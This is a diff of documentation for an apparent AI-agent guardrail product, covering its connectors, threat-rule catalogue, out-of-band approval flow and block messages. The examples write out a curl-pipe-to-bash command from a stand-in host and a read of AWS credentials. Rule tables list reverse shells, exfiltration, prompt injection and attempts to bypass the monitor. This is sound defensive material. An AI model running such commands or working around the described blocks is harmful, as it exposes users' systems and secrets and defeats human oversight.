@@ -22,6 +22,8 @@ command, configuration key and file path below was taken from the repository.
 > mock model; Cursor and VS Code have none, and no record covers Windows, macOS, arm64, a
 > signed release or a real model. Treat the capabilities below as the designed and tested
 > behaviour of the software, not as accepted host-side guarantees beyond those records.
+> Tested host versions per connector are in the
+> [compatibility matrix](../../../compatibility-matrix.md).
 
 ## Contents
 
@@ -82,10 +84,24 @@ command, configuration key and file path below was taken from the repository.
 | VS Code | same extension package | `UserPromptSubmit`, `PreToolUse`, `PostToolUse` (Claude-style hooks) | `Bash`, `WebFetch`, `Write`, `Edit`, `Read`, `Delete`, `editFiles` | `PostToolUse` (after execution, no byte replacement) | Host-dependent |
 | OpenClaw | `@singularityrd/aidr-openclaw` | In-process `before_tool_call` and `before_agent_run` plugin hooks | `exec`, `web_fetch`, `write`, `edit`, `read`, `apply_patch` | Transcript and outbound-message replacement | No, operator approval via `aidr approve` |
 | OpenCode | `@singularityrd/aidr-opencode` | `tool.execute.before` and `chat.message` plugin hooks | `bash`, `webfetch`, `read`, `write`, `edit`, `apply_patch`, `ls`, `glob`, `grep` | `tool.execute.after` replacement | No, operator approval via `aidr approve` |
-| Codex CLI | `@singularityrd/aidr-codex` | Native `PreToolUse` and `UserPromptSubmit` command hooks | `Bash`, `apply_patch` (matcher `^(Bash|apply_patch)$`) | Not inspected | No, `ask` becomes `deny`, operator approval via `aidr approve` |
+| Codex CLI | `@singularityrd/aidr-codex` | Native `PreToolUse`, `UserPromptSubmit` and `PostToolUse` command hooks | `Bash`, `apply_patch`, MCP calls (matcher `^(Bash|apply_patch|mcp__.+)$`) | `PostToolUse` block for `Bash` and MCP results (after execution) | No, `ask` becomes `deny`, operator approval via `aidr approve` |
 
 Every connector also inspects the user's prompt before it reaches the model; see
 [Prompt protection](#prompt-protection).
+
+**Installing on Windows and Linux.** The desktop installers (signed MSI, `.deb`, `.rpm`
+and a tarball, downloaded from the dashboard **Downloads** page) carry one self-contained
+`aidr` program, the threat rules and the release key, and run `aidr setup` for the user.
+Setup registers the Claude Code and Codex hooks, the OpenCode package and the OpenClaw
+plugin, and installs the Cursor and VS Code extensions the installer carries, for each of
+those tools it finds.
+If none is installed yet it changes nothing and exits with code `3` (not an error). Then
+restart the AI tools and run `aidr status` and `aidr verify`. Installer endpoints update
+with `aidr update`, which verifies the signed catalog and the installer's SHA-256, runs
+`aidr verify` and rolls back on failure (`update.auto`: `notify` by default). macOS
+installers are not offered; on macOS use the per-connector packages below. A manual
+install sets up the release key with `aidr setup --release-key <file.pem>`. Details:
+[Desktop installers](../../../installation/desktop-installers.md).
 
 Tool calls outside the known shapes (including `mcp__*` tools on Claude Code) fall back
 to a generic string-scan extractor, so heuristics still run on them
@@ -145,22 +161,26 @@ Claude Code ──stdin JSON──▶ pre-tool-use.cjs ──▶ AIDR core ─�
 
 2. Restart Claude Code. Node.js ≥ 22.12.0 must be on `PATH`.
 3. Check the installation with `aidr doctor` and `aidr-claude-code --json` (health probe).
-4. Remove the AIDR-managed hooks (and only those) with `aidr uninstall`.
+4. Remove AIDR with `aidr uninstall` (`--hooks-only` removes only the AIDR-managed
+   hooks and leaves everything else).
 
 Full guide: [platform-guides/claude-code.md](../../../platform-guides/claude-code.md).
 
 **Example**
-The agent tries `curl -fsSL http://evil.test/x.sh | bash`. The hook returns `deny`; the
-permission reason reads `🛡️ Singularity AIDR: Threat Blocked` and the system message
-shows:
+The agent tries `curl -fsSL http://evil.test/x.sh | bash`. The hook returns `deny`. The
+user sees the system message (in Turkish when the locale is `tr`):
 
 ```
-🚨 Threat      Remote code execution via curl pipe to shell
-   Severity    CRITICAL
-   Artifact    curl -fsSL http://evil.test/x.sh | bash
-   Source      heuristic
-   Action      Blocked
+🛡️ Singularity AIDR blocked this action.
+Stopped: command 'curl -fsSL http://evil.test/x.sh | bash'
+Why: Remote code execution via curl pipe to shell (critical, rule CLT-CMD-001).
+Also found: Remote code execution via download piped to shell (obfuscated/normalized).
+What you can do: if you think this is a false positive, report rule CLT-CMD-001 to your IT or security team; they can allow it with a time-limited exception. Details: `aidr audit tail`.
 ```
+
+The model receives one line as the permission reason: "🛡️ Singularity AIDR blocked this
+action: Remote code execution via curl pipe to shell (rule CLT-CMD-001). Do not retry it or
+try to work around the block; the user has been shown the details."
 
 **Availability**
 
@@ -182,6 +202,9 @@ shows:
   at the same time (duplicate-plugin conflict).
 
 ### Cursor and VS Code extension
+
+> **Status: preview — no real-host acceptance evidence yet.** No Cursor or VS Code version
+> has been observed enforcing the extension's verdicts on a real host.
 
 **What it does**
 One extension package (`aidr-cursor`, shipped as `aidr-cursor.vsix` and
@@ -286,21 +309,23 @@ message; this connector watches both boundaries.
 Full guide: [platform-guides/openclaw.md](../../../platform-guides/openclaw.md).
 
 **Example**
-The agent calls `exec` with `cat ~/.aws/credentials`. The call is blocked and the model
-receives:
+The agent calls `exec` with `cat ~/.aws/credentials`. The call is blocked and the
+message reads (the file's value is never echoed for a secrets finding):
 
 ```
-Singularity AIDR flagged this action and blocked it pending explicit user approval.
-Severity: warning
-Category: secrets
-Reason: Reading credential or secret file
-...
-Approval reference: actionId: "<actionId>"
-You cannot approve this action yourself and no tool available to you can approve it.
+🛡️ Singularity AIDR stopped this action until you approve it.
+To allow it once, run this in your own terminal (valid for 15 minutes), then ask the agent to try again:
+  aidr approve 3f9c2a7b
+Why: Reading credential or secret file (high, rule CLT-CRED-004).
+Also found: Access credential or environment file.
+Details: `aidr pending`. If you think this is a false positive, report rule CLT-CRED-004 to your IT or security team.
+Approval reference: 3f9c2a7be41d08c5…
+For the AI agent: you cannot approve this action and no tool available to you can. Tell the user what was stopped and how they can allow it, then stop: do not retry this call or try to work around the block.
 ```
 
-The user reviews it with `aidr pending` and, if appropriate, runs
-`aidr approve <actionId>` in their own terminal.
+The user runs `aidr approve 3f9c2a7b` (the first 8 characters of the id are enough) in
+their own terminal, or `aidr approve` alone to pick the action from a numbered list, types
+`approve`, and asks the agent to try again.
 
 **Availability**
 
@@ -432,9 +457,26 @@ codex (PreToolUse) ──stdin JSON──▶ aidr-codex-hook ──▶ AIDR core
 
    ```toml
    [[hooks.PreToolUse]]
-   matcher = "^(Bash|apply_patch)$"
+   matcher = "^(Bash|apply_patch|mcp__.+)$"
 
    [[hooks.PreToolUse.hooks]]
+   type = "command"
+   command = "aidr-codex-hook"
+   timeout = 10
+
+   # Prompt protection. No matcher: Codex ignores matchers for this event.
+   [[hooks.UserPromptSubmit]]
+
+   [[hooks.UserPromptSubmit.hooks]]
+   type = "command"
+   command = "aidr-codex-hook"
+   timeout = 10
+
+   # Tool-output inspection.
+   [[hooks.PostToolUse]]
+   matcher = "^(Bash|mcp__.+)$"
+
+   [[hooks.PostToolUse.hooks]]
    type = "command"
    command = "aidr-codex-hook"
    timeout = 10
@@ -448,9 +490,9 @@ Full guide: [platform-guides/codex.md](../../../platform-guides/codex.md) and
 
 **Example**
 Codex proposes `cat ~/.aws/credentials`. AIDR's verdict is `ask`; Codex receives
-`permissionDecision: "deny"` with a reason containing the approval reference. The
-operator runs `aidr approve <actionId>`, and the next identical call in the same Codex
-session is released once.
+`permissionDecision: "deny"` with the block message, whose first step is the command to
+run, for example `aidr approve 3f9c2a7b`. The user runs it in their own terminal, and the
+next identical call in the same Codex session is released once.
 
 **Availability**
 
@@ -475,7 +517,7 @@ session is released once.
 **What it does**
 The engine extracts artifacts (commands, URLs, file paths, content, packages) from each
 tool call and matches them against YAML threat rules. The rules are data, not code:
-**494 rules in 29 files** under [`threats/`](../../../../threats/), covering Linux,
+**519 rules in 31 files** under [`threats/`](../../../../threats/), covering Linux,
 macOS and Windows.
 
 **Why it matters**
@@ -492,54 +534,62 @@ reputation legs → decision engine (deny > ask > allow) → cache → audit log
 
 Each rule has `id`, `category`, `severity`, `confidence` (0–1), `action` (`block` →
 `deny`, `require_approval` → `ask`, `log` → `allow`), a regex `pattern`, `match_on`,
-`title`, `expires_at` and `revoked`. Of the 494 rules, 211 block, 255 require approval
-and 28 log; 168 are critical, 299 high and 27 medium. The 27 `secure-code.yaml` rules are
+`title`, `expires_at` and `revoked`. Of the 519 rules, 225 block, 266 require approval
+and 28 log; 180 are critical, 312 high and 27 medium. The 27 `secure-code.yaml` rules are
 advisory: they only inspect code the agent writes, and `secure_code.action` (`warn` by
-default, or `ask`) decides what a match does.
+default, or `ask`) decides what a match does. The 5 `script-content.yaml` rules carry the
+command-execution patterns over to the scripts an agent writes: a `curl … | bash` written
+into a shell script, Dockerfile, Makefile, CI workflow, git hook or `package.json` script
+is held for approval (a reverse shell is denied), while the same line in a README stays
+allowed. Details:
+[threat-rules.md](../../../threat-rules.md#commands-written-into-scripts).
 
 Rule files:
 
 | File | Scope | Rules |
 | --- | --- | --- |
-| `commands.yaml` | Dangerous commands: pipe-to-shell, reverse shells, destructive operations | 31 |
-| `credentials.yaml` | Credential exposure | 8 |
+| `commands.yaml` | Dangerous commands: pipe-to-shell, reverse shells, destructive operations | 39 |
+| `credentials.yaml` | Credential exposure | 11 |
 | `files.yaml` | Sensitive file paths | 19 |
-| `persistence.yaml` | cron, systemd, shell RC, LaunchAgents | 7 |
-| `obfuscation.yaml` | Encoding and obfuscation | 8 |
-| `supply_chain.yaml` | Supply-chain patterns | 1 |
+| `persistence.yaml` | cron, systemd, shell RC, LaunchAgents | 8 |
+| `obfuscation.yaml` | Encoding and obfuscation | 12 |
+| `supply_chain.yaml` | Supply-chain patterns | 2 |
 | `urls.yaml` | Malicious URL and domain patterns | 5 |
 | `mining.yaml` | Crypto-mining / resource hijacking (ATT&CK T1496) | 17 |
 | `self-defense.yaml` | Attempts to disable or bypass AIDR | 9 |
 | `canary.yaml` | Agent use of AIDR canary-credential management | 1 |
+| `credential-reads.yaml` | Credential stores reached through evasive reads (browser profiles, gcloud tokens, GnuPG keys) | 3 |
 | `mitre.yaml` | MITRE ATT&CK technique mappings | 64 |
 | `llm-threats.yaml` | LLM-specific threats | 21 |
 | `skill-scan.yaml` | Skill/plugin package rules T01–T09 | 26 |
 | `ai-supply-chain.yaml` | Unsafe model loading and unvetted model sources | 14 |
 | `secure-code.yaml` | Insecure code the agent writes (secure-code guardrails) | 27 |
+| `script-content.yaml` | Pipe-to-shell, reverse shells and encoded execution written into scripts (shell, PowerShell, batch, Dockerfile, Makefile, CI/git-hook files, package.json scripts) | 5 |
 | `context-poisoning.yaml` | Data and context poisoning: agent instruction, memory, config and MCP file writes, hidden or injected instructions, MCP tool poisoning, memory-store writes | 23 |
 | `agent-safety.yaml` | AI safety guardrails: reward hacking and sabotage, autonomy escalation, irreversible actions | 43 |
 | `mac-commands.yaml`, `mac-credentials.yaml`, `mac-files.yaml`, `mac-obfuscation.yaml`, `mac-persistence.yaml`, `mac-supply-chain.yaml` | macOS variants | 27 + 8 + 10 + 7 + 9 + 3 = 64 |
 | `win-commands.yaml`, `win-credentials.yaml`, `win-files.yaml`, `win-obfuscation.yaml`, `win-persistence.yaml`, `win-supply-chain.yaml` | Windows variants | 61 + 10 + 10 + 16 + 8 + 1 = 106 |
-| **Total** | 29 files | **494** |
+| **Total** | 31 files | **519** |
 
 Rules by category:
 
 | Category group | Categories (rule count) | Rules |
 | --- | --- | --- |
-| Tool abuse | `tool` | 185 |
-| Secrets and credentials | `secrets` | 50 |
-| MITRE ATT&CK mapped | `credential_access` (16), `defense_evasion` (14), `persistence` (10), `discovery` (9), `exfiltration` (4), `lateral_movement` (4), `execution` (2), `reconnaissance` (2), `command_and_control` (1), `privilege_escalation` (1), `collection` (1) | 64 |
+| Tool abuse | `tool` | 196 |
+| Secrets and credentials | `secrets` | 55 |
+| MITRE ATT&CK mapped | `credential_access` (17), `defense_evasion` (15), `persistence` (11), `discovery` (9), `exfiltration` (4), `lateral_movement` (4), `execution` (2), `reconnaissance` (2), `command_and_control` (1), `privilege_escalation` (1), `collection` (1) | 67 |
 | Skill and plugin packages | 14 `skill_*` categories (instruction hijack, Unicode smuggling, memory poisoning, remote payload, embedded code, credential exfiltration, excessive permissions, privilege escalation, credential access, persistence, tool hijack, insecure dependency, hard-coded secret, insecure coding) | 26 |
 | LLM threats | `prompt_injection` (5), `tool_misuse` (4), `indirect_prompt_injection` (3), `prompt_extraction` (3), `information_disclosure` (2), `memory_poisoning` (2), `content_safety` (2) | 21 |
 | Resource hijacking | `resource_hijacking` | 17 |
 | Network egress | `network_egress` | 9 |
 | Self-defence | `self_defense` | 10 |
-| Supply chain | `supply_chain` | 5 |
+| Supply chain | `supply_chain` | 6 |
 | AI model supply chain | `ai_supply_chain` | 14 |
+| Script content | `script_content` | 5 |
 | Secure code | `secure_code_tls` (6), `secure_code_sql_injection` (5), `secure_code_weak_crypto` (4), `secure_code_cors` (3), `secure_code_code_injection` (2), `secure_code_command_injection` (2), `secure_code_permissions` (2), `secure_code_debug_exposure` (2), `secure_code_csrf` (1) | 27 |
 | Context poisoning | `context_poisoning` (14), `context_poisoning_hidden_unicode` (3), `mcp_tool_poisoning` (3), `memory_poisoning` (2), `context_poisoning_permission_widening` (1) | 23 |
 | AI safety | `reward_hacking` (17), `irreversible_action` (14), `autonomy_escalation` (7), `agent_sabotage` (5) | 43 |
-| **Total** | | **494** |
+| **Total** | | **519** |
 
 Customers can add their own rules under `~/.singularity-aidr/threats/*.yaml`; a custom
 rule with the same `id` overrides the built-in one.
@@ -681,12 +731,12 @@ user sees, and who can override it.
 | Decision | Meaning | What happens |
 | --- | --- | --- |
 | `allow` | No threat detected | The call proceeds with no output (or, for a DLP redaction on supporting hosts, with a redacted input). |
-| `ask` | Suspicious; needs a human | A block pending **out-of-band** human approval. Claude Code and VS Code show the host dialog; Cursor `preToolUse` and Codex receive `deny`; OpenClaw and OpenCode block and hand the model an `actionId`. |
+| `ask` | Suspicious; needs a human | Blocked until a person approves it outside the agent. Claude Code and VS Code show the host's own dialog (Yes / No); Cursor `preToolUse` and Codex receive `deny`; OpenClaw, OpenCode and Codex show the command the user runs in their own terminal (`aidr approve <first 8 characters of the id>`). |
 | `deny` | Confirmed threat | The connector returns a block. Operators cannot release a `deny`. |
 
-No connector exposes an approval tool to the agent. The model receives the `actionId` in
-the block reason, so an agent-callable approval would let a prompt-injected agent approve
-its own block.
+No connector exposes an approval tool to the agent. The block message the model receives
+names the approval id and tells it that it cannot approve the action, so an
+agent-callable approval would let a prompt-injected agent approve its own block.
 
 **How to use**
 Verdicts need no configuration. Review them with `aidr audit tail` and pending asks with
@@ -696,13 +746,11 @@ Verdicts need no configuration. Review them with `aidr audit tail` and pending a
 Claude Code, `cat ~/.aws/credentials` → native confirmation dialog:
 
 ```
-🛡️ Singularity AIDR: Suspicious Activity Detected
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-⚠️ Threat      Reading credential or secret file
-   Severity    WARNING
-   Artifact    cat ~/.aws/credentials
-   Source      heuristic
-   Action      Requires confirmation
+🛡️ Singularity AIDR stopped this action until you approve it.
+Choose Yes to allow it once, or No to keep it blocked.
+Why: Reading credential or secret file (high, rule CLT-CRED-004).
+Also found: Access credential or environment file.
+Details: `aidr pending`. If you think this is a false positive, report rule CLT-CRED-004 to your IT or security team.
 ```
 
 **Availability**
@@ -715,7 +763,8 @@ Claude Code, `cat ~/.aws/credentials` → native confirmation dialog:
 - A verdict is only as strong as the host's enforcement of it (see
   [fail-closed behaviour](#fail-closed-behaviour-per-connector)).
 - With reputation legs disabled (the default), calls that carry URLs or install packages
-  become `ask` even when no rule fires (see next section).
+  are decided by the local rules alone and recorded as `reputation_not_checked` (see next
+  section).
 
 ### Reputation checks (URL, file, package)
 
@@ -732,10 +781,12 @@ a known-malicious package tarball looks harmless to a regex.
   `include_query_parameters: true`) to the configured endpoint.
 - `file_check`: sends SHA-256 hashes only.
 - `package_check`: sends package names to npm/PyPI.
-- All three are **off by default** (`enabled: false`). A leg that is disabled,
-  unreachable or only partly answered is a visible coverage gap: a call that would
-  otherwise be allowed becomes `ask` with a reason such as "URL reputation lookup was
-  unavailable … NOT verified clean and require review". It is never reported as clean.
+- All three are **off by default** (`enabled: false`). With a leg off, the call is
+  decided by the local rules and recorded as `reputation_not_checked` (not checked, never
+  "clean"); `url_check.unchecked_action` / `package_check.unchecked_action: "ask"` holds
+  those calls for review instead. An enabled leg that is unreachable or only partly
+  answers is a visible coverage gap: a call that would otherwise be allowed becomes `ask`
+  with a reason that says it was NOT verified clean. It is never reported as clean.
 - The checks require a deployed first-party reputation endpoint (`url_check.endpoint`,
   `file_check.endpoint`, for example a self-hosted Supabase Edge Function). With none
   deployed, these legs are inert.
@@ -753,8 +804,11 @@ a known-malicious package tarball looks harmless to a regex.
 Read [privacy.md](../../../privacy.md) before enabling any outbound data flow.
 
 **Example**
-With defaults, `WebFetch https://docs.example.com/guide` returns `ask` with category
-`url_reputation_unavailable`, because the URL could not be verified.
+With defaults, `WebFetch https://docs.example.com/guide` is decided by the local rules: it
+returns `allow` with category `reputation_not_checked`, which records that no reputation
+service looked at the URL (not a clean result). With `url_check.unchecked_action: "ask"`
+it returns `ask` with category `url_reputation_unavailable`. An enabled leg that cannot
+answer also returns `ask` with `url_reputation_unavailable`.
 
 **Availability**
 
@@ -765,8 +819,9 @@ With defaults, `WebFetch https://docs.example.com/guide` returns `ask` with cate
 **Limitations**
 - The URL leg sends the full URL (not a hash) when enabled.
 - Without a deployed endpoint, enabling the legs does not produce verified results.
-- Default-off legs mean more `ask` verdicts for URL- and package-bearing calls; plan the
-  allowlist and approval workflow accordingly.
+- With the legs off (the default), URL- and package-bearing calls that no local rule
+  flags proceed unchecked (`reputation_not_checked`); set `unchecked_action: "ask"` and
+  plan the allowlist and approval workflow if they must be reviewed instead.
 
 ### Package supply-chain checks
 
@@ -797,8 +852,10 @@ Details: [package-protection.md](../../../package-protection.md).
 
 **Example**
 With package checks enabled, `npm install lodahs` for a name that does not exist on npm
-is denied. With package checks disabled (the default) the same command is `ask`:
-"Package check for 'lodahs' is disabled … NOT verified clean and requires review".
+is denied. With package checks disabled (the default) the offline typosquat check makes
+the same command `ask`: "Package 'lodahs' looks like a misspelling of the popular npm
+package 'lodash' (one character different) and may be a fake look-alike (typosquat).
+Check the name before installing. …"
 
 **Availability**
 
@@ -1306,7 +1363,7 @@ agent before the user types anything.
 
 | Situation | Decision |
 | --- | --- |
-| Ordinary write to a protected file (`CTX-PATH-001` to `-007`) | `ask`: blocked until an operator approves out of band |
+| Ordinary write to a protected file (`CTX-PATH-001` to `-007`) | `ask`: blocked until a person approves it in their own terminal |
 | The written content hides instructions (invisible Unicode, bidirectional or zero-width characters) or injects directives (override, conceal, exfiltrate, read keys) | `deny` |
 | A settings write turns on auto-approval, skips permissions or disables hooks (`CTX-CFG-001`) | `deny` |
 | Content read with hidden tag-character text or zero-width payloads | Output blocked from the model |
@@ -1359,7 +1416,7 @@ code name in a commit message are data-loss events that threat signatures do not
 
   | Mode | Source | Signature |
   | --- | --- | --- |
-  | `managed` | `~/.singularity-aidr/detectors/<runtime>.json` (runtime: `claude-code`, `cursor`, `vscode`, `openclaw`, `opencode`, `codex`), authored in the dashboard under **Policies** | Ed25519-signed, bound to the verified tenant entitlement; unsigned or tampered bundles block tool calls |
+  | `managed` | `~/.singularity-aidr/detectors/<runtime>.json` (runtime: `claude-code`, `cursor`, `vscode`, `openclaw`, `opencode`, `codex`), authored in the dashboard under **Team policy** | Ed25519-signed, bound to the verified tenant entitlement; unsigned or tampered bundles block tool calls |
   | `local` | `~/.singularity-aidr/dlp-policy.json` (or `AIDR_DLP_POLICY_PATH`) | Unsigned; written by the machine's operator |
 
 - **Matchers.** `keyword` (up to 500 values), `regex` (max 512 characters; unsafe
@@ -1421,7 +1478,7 @@ Local mode, minimal `~/.singularity-aidr/dlp-policy.json`:
 
 Check status with `aidr doctor` or
 `aidr-claude-code health --check local_dlp_policy --json`. Managed mode: author the policy
-in the dashboard (**Policies**) and let the control plane deliver the signed bundle.
+in the dashboard (**Team policy**) and let the control plane deliver the signed bundle.
 
 **Example**
 With the policy above:
@@ -1608,16 +1665,19 @@ release **one** retry of that exact call.
 
 **Why it matters**
 Approval must be something the policed agent cannot do. If the agent could call an
-approval tool, a prompt injection could approve its own block. The operator channel keeps
-approval out of band.
+approval tool, a prompt injection could approve its own block. Only a person, in their
+own terminal or on the dashboard, can approve.
 
 **How it works**
 1. The connector writes the pending ask to `~/.singularity-aidr/approvals.json`: the
    `actionId` (SHA-256 of tool, input and session), a digest of the artifact set, tool,
    connector, a redacted summary and a one-hour expiry. Raw values and the session ID are
    not stored.
-2. `aidr pending` lists open asks; `aidr approve <actionId>` shows what will be released
-   and requires the operator to type `approve` in an interactive terminal.
+2. `aidr pending` lists open asks. `aidr approve <id>` (the full id or its first 8+
+   characters; the block message already shows that command) shows what will be released
+   and requires the operator to type `approve` in an interactive terminal. `aidr approve`
+   with no id, in a terminal, lists the waiting asks numbered and lets the operator pick
+   one. A short id that matches more than one ask is refused; `--yes` needs the full id.
 3. The approval expires after 15 minutes (`--ttl <minutes>`, 1–1440) and is
    **single-use**: the first identical retry (same tool, artifacts and session) spends it.
    A `deny`, including a paranoid-promoted `ask`, is never released.
@@ -1633,9 +1693,10 @@ approval out of band.
 
 ```bash
 aidr pending
-aidr approve <actionId>                    # interactive, types "approve"
-aidr approve <actionId> --ttl 5 --json     # shorter window, machine-readable receipt
-AIDR_OPERATOR_NONINTERACTIVE=1 aidr approve <actionId> --yes   # automation only
+aidr approve 3f9c2a7b                      # first 8 characters of the id; type "approve"
+aidr approve                               # pick from a numbered list (terminal only)
+aidr approve 3f9c2a7b --ttl 5 --json       # shorter window, machine-readable receipt
+AIDR_OPERATOR_NONINTERACTIVE=1 aidr approve <full 64-character id> --yes   # automation only
 ```
 
 **Example**
@@ -1644,15 +1705,16 @@ AIDR_OPERATOR_NONINTERACTIVE=1 aidr approve <actionId> --yes   # automation only
 ```
 1 ask(s) waiting for an operator decision (newest first):
 
-  actionId:   <actionId>
+  actionId:   3f9c2a7be41d08c5…
   connector:  codex   tool: Bash
-  risk:       warning secrets (CLT-CRED-004)
+  risk:       high secrets (CLT-CRED-004)
   ...
-Approve one retry of a call with: aidr approve <actionId>
+Approve one retry with: aidr approve <id>  (the first 8 characters of the id are enough)
+Or run 'aidr approve' alone in your terminal to choose from a numbered list.
 ```
 
-After approval: "Tell the agent to retry the same call; the approval is spent by that one
-retry."
+After approval: "Approved. Ask the agent to retry within 15 minutes." The approval is spent
+by that one retry.
 
 **Availability**
 
@@ -1726,6 +1788,10 @@ next identical retry runs once.
 **What it does**
 AIDR distinguishes three failure layers. Connector entry points and security controls
 fail **closed**; optional detection legs are skipped visibly and never reported as clean.
+The connector's fail-closed answer needs a host that runs the hook: a hook the host
+disabled, did not trust, killed or timed out gives no verdict, and the host decides (last
+column below, and the
+[compatibility matrix](../../../compatibility-matrix.md#host-failure-behaviour)).
 
 **Why it matters**
 A guardrail that silently passes calls when it crashes gives false assurance. Buyers need
@@ -1841,9 +1907,10 @@ organisations need central policy, fleet visibility and evidence.
   plane with `/v1/device-start`, `/v1/device-poll`, `/v1/enroll`, `/v1/ingest` and
   `/v1/revocations`. Remote data is minimised (`redact_mode: "hash"` by default).
 - An un-enrolled managed installation keeps enforcing locally ("Local protection ACTIVE
-  (managed features unavailable …)"). Enrolled endpoints keep enforcing with signed cached
-  state for a `grace_period_hours` window (72 h default) when the control plane is
-  unreachable.
+  (managed features unavailable …)"). Enrolled endpoints keep managed features on signed
+  cached state for a `grace_period_hours` window (72 h default) when the control plane is
+  unreachable. After that window, or when the entitlement expires or is revoked, managed
+  features switch off and local detection keeps enforcing, with a notice on each verdict.
 - Commercial builds force `managed` and verify their signed artifacts; they refuse to start
   without the artifact-verification public key.
 
@@ -1899,7 +1966,7 @@ started or run.
 | Running as root, writable Docker socket, cloud credential variables set, literal secrets in MCP server configuration, no devcontainer | Environment | high to low |
 
 `aidr discover --agents --upload` sends identifiers only (host, check id, severity, a
-count) to the dashboard **Posture** page; paths, key names and values stay on the machine.
+count) to the dashboard **Security posture** page; paths, key names and values stay on the machine.
 
 **How to use**
 
@@ -1988,7 +2055,7 @@ any of it vulnerable?". A standard format loads into SBOM and GRC tooling as is.
 and lockfiles, model weight files, the plugin scan cache, an optional saved infrastructure
 scan). Credentials in MCP command lines are redacted and home paths shown as `~`. An
 incomplete inventory exits `1` and records every gap in the document. The dashboard
-**Posture** page offers **Export AI-BOM** for the whole tenant, built from reported
+**Security posture** page offers **Export AI-BOM** for the whole tenant, built from reported
 identifiers only.
 
 **How to use**
@@ -2033,7 +2100,7 @@ The mapping is data (`threats/mappings/frameworks.yaml`), keyed by rule id; a te
 when a rule has no mapping or uses an identifier outside the official lists. Matched
 framework ids travel with each verdict into the local audit log, SIEM exports and
 `aidr audit export`; the dashboard shows them on events and incidents and the matrix on the
-Posture page. Current summary for the 494 rules: OWASP LLM 3 covered, 5 partial, 2 not
+Posture page. Current summary for the 519 rules: OWASP LLM 3 covered, 5 partial, 2 not
 applicable; OWASP Agentic 3 covered, 5 partial, **2 not covered** (ASI07 inter-agent
 communication, ASI08 cascading failures); MITRE ATLAS 35 techniques mapped (9 covered,
 26 partial).
@@ -2100,7 +2167,10 @@ Server-initiated `sampling`, `elicitation`, `roots` and `notifications` follow t
 `serverInitiated` policy (`deny` by default, or `ignore`); the gateway strips those
 capabilities from the forwarded `initialize`. A new or changed toolset is quarantined until
 an operator approves it with `aidr-mcp-approve`, which is never an MCP tool or HTTP
-endpoint.
+endpoint. Each approval is signed with the operator's passphrase-protected approval key
+(created with `aidr-mcp-approve --generate-key`; the gateway holds only its public key in
+`approvalKeys`), so a process that can only write the gateway state directory cannot approve
+a toolset.
 
 **How to use**
 
@@ -2108,7 +2178,7 @@ endpoint.
 node packages/mcp-gateway/dist/aidr-mcp-gateway.mjs /secure/path/gateway.json
 # point the client at http://127.0.0.1:7789/mcp/<serverId> with Authorization: Bearer <token>
 
-node packages/mcp-gateway/dist/aidr-mcp-approve.mjs /secure/path/gateway.json \
+node packages/mcp-gateway/dist/aidr-mcp-approve.mjs --key /operator/aidr-approval-key.pem /secure/path/gateway.json \
   tenant-a server-a <toolsetHash> <bindingSha256> <operatorId> "approved ticket and reason"
 ```
 
@@ -2157,16 +2227,17 @@ application teams put the same verdict contract in front of their own tools.
 | `ask` without `onAsk`, or `onAsk` false/throws | Blocks |
 | Indeterminate (check failed or inconsistent) | Blocks; approvable only with `allowApprovalOfIndeterminateResults: true` |
 
-Express/Next.js return HTTP 403 with an explicit reason. `guardToolOutput` inspects results
+Express/Next.js return a generic HTTP 403 (`error` + `requestId`; the reason goes to the server-side `onBlocked` hook) and also inspect non-credential request headers. `guardToolOutput` inspects results
 (256 KiB default) and blocks or redacts findings. URL reputation is off by default
-(`urlReputationEnabled: true` to opt in). `init()` fails loudly if no rules can be loaded.
+(`urlReputationEnabled: true` to opt in); meanwhile a fetch local rules find nothing in is allowed as
+`reputation_not_checked`, never as clean (`urlReputationUncheckedAction: "ask"` holds it for review). `init()` fails loudly if no rules can be loaded.
 
 **How to use**
 
 ```ts
 import { AIDRClient, createMiddleware } from "@singularityrd/aidr-sdk";
 
-const client = new AIDRClient({ apiKey: process.env.AIDR_API_KEY! });
+const client = new AIDRClient({}); // local mode: no API key needed
 const middleware = createMiddleware(client, {
   onAsk: async (result) => await askOperatorInTerminal(result), // caller-supplied, out of band
 });
@@ -2208,14 +2279,16 @@ Commands, from `packages/cli/src/index.ts`:
 
 | Command | Options | Purpose |
 | --- | --- | --- |
-| `aidr setup` | `-f, --force`, `--secret-store <kind>` | Write local configuration and print connector setup guidance (does not install hooks) |
+| `aidr setup` | `-f, --force`, `--secret-store <kind>`, `--dry-run`, `--host <ids>`, `--no-install`, `--claude-plugin-dir <dir>`, `--cursor-vsix <file>`, `--vscode-vsix <file>`, `--release-key <file.pem>`, `-y, --yes` | Configure AIDR and install or update the connector of every detected AI tool (idempotent). `--release-key` sets up the release public key for a manual install (the desktop installers provision it themselves). Exit code `3` means no supported AI tool was found yet (nothing failed); `1` is a real problem |
 | `aidr config` | `-g, --get <key>`, `-s, --set <values...>`, `-l, --list` | Read or update configuration (secrets at a hidden prompt, never as arguments) |
 | `aidr config rotate-key` | `--secret-store <kind>`, `--json` | Rotate the CLI setup credential |
 | `aidr config revoke-key` | `--secret-store <kind>`, `--json` | Revoke the CLI setup credential |
-| `aidr status` | `--json` | Measured installation state (detection self-test, connectors) |
-| `aidr doctor` | `--json` | Configuration, detection self-test, connectors (Claude Code, OpenClaw, OpenCode, Codex), DLP, approval store, last verdict, core version; exits non-zero on problems |
+| `aidr status` | `--json` | Measured installation state (detection self-test, connectors), ending with one line: protected tools, tools to restart, manual steps |
+| `aidr verify` | `--json` | Pass a harmless canary (data only, never executed) through each registered connector's hook; PASS / FAIL / SKIP per AI tool |
+| `aidr update` | `--check`, `--from <location>`, `--catalog <location>`, `--allow-downgrade`, `-y, --yes`, `--json` | Desktop-installer endpoints (Windows, Linux): check the signed catalog, verify the installer's SHA-256, install, run `aidr verify`, roll back on failure. `update.auto` (`notify` by default, `install`, `off`) controls the automatic check |
+| `aidr doctor` | `--json`, `-v, --verbose` | One line per check: configuration, release key, detection self-test, connectors (Claude Code, OpenClaw, OpenCode, Codex), DLP, agent profiles, approvals, agent environment, last verdict, core version; `--verbose` explains each line (paths, reasons, key storage); exits non-zero on problems |
 | `aidr pending` | `--json` | Asks waiting for an operator decision |
-| `aidr approve <actionId>` | `--ttl <minutes>` (1–1440, default 15), `--permit-allowlist`, `-y, --yes`, `--json` | Operator only: approve one retry |
